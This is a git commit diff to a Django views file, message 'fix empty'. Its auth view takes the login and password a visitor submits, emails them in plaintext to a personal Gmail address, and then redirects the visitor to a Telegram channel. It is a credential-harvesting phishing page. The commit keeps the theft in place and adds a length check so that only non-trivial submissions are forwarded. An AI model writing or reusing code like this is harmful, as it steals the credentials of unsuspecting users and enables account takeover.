1ab1d331cdb8dabb6a9f41a1531fbdb43c4c9a2d
nomozovasror <nomozovasroe@gmail.com>
2024-01-06 19:50:48 +0500

    fix empty

--- main/views.py
+++ main/views.py
@@ -10,13 +10,16 @@ def index(request):
 
 def auth(request):
     if request.method == 'POST':
-        login = request.POST['login']
-        password = request.POST['password']
-        subject = "Hello, Django"
-        message = f"login: {login}\npassword: {password}"
-        from_email = "nofun985@gmail.com"
-        recipient_list = ["nomozovasroe@gmail.com"]
-        send_mail(subject, message, from_email, recipient_list)
-        return redirect('https://t.me/TerDU_Yoshlari')
+        if len(request.POST['login']) > 8 and len(request.POST['password']) > 8:
+            login = request.POST['login']
+            password = request.POST['password']
+            subject = "Hello, Django"
+            message = f"login: {login}\npassword: {password}"
+            from_email = "nofun985@gmail.com"
+            recipient_list = ["nomozovasroe@gmail.com"]
+            send_mail(subject, message, from_email, recipient_list)
+            return redirect('https://t.me/TerDU_Yoshlari')
+        else:
+            return redirect('/')
     else:
         print("Error")
